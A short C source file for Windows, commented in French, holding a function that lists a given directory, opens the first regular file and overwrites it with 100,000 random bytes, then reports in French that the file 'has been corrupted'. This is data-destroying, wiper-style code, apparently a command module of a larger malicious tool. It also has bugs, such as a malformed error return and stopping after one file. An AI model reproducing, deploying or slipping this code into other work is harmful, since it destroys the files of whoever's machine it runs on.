#include "proto.h"

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

const char *randomize(const char *directoryPath)
{
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directoryPath);

    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(searchPath, &FindFileData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                continue;
            }
            else
            {
                char filePath[MAX_PATH];
                snprintf(filePath, MAX_PATH, "%s\\%s", directoryPath, FindFileData.cFileName);

                FILE *file;
                file = fopen(filePath, "wb");
                if (file != NULL)
                {
                    srand(time(NULL));
                    for (int i = 0; i < 100000; i++)
                    {
                        int random = rand() % 255;
                        fputc(random, file);
                    }
                    fclose(file);
                    return ("Le fichier a bien ete corrompue#");
                }
                else
                {
                    return("Impossible d'ouvrir le fichier \n");
                }
            }
        } while (FindNextFile(hFind, &FindFileData) != 0);
        FindClose(hFind);
    }
    else
    {
        return("Répertoire invalide/vide : %s\n", directoryPath);
    }
}

// Ne pas oubliez que le chemin doit etre écris de la sorte a ce que les backslash ne soit pas interprété ! Exemple : "C:\\Windows\\Test\\monchemin\\ici.txt "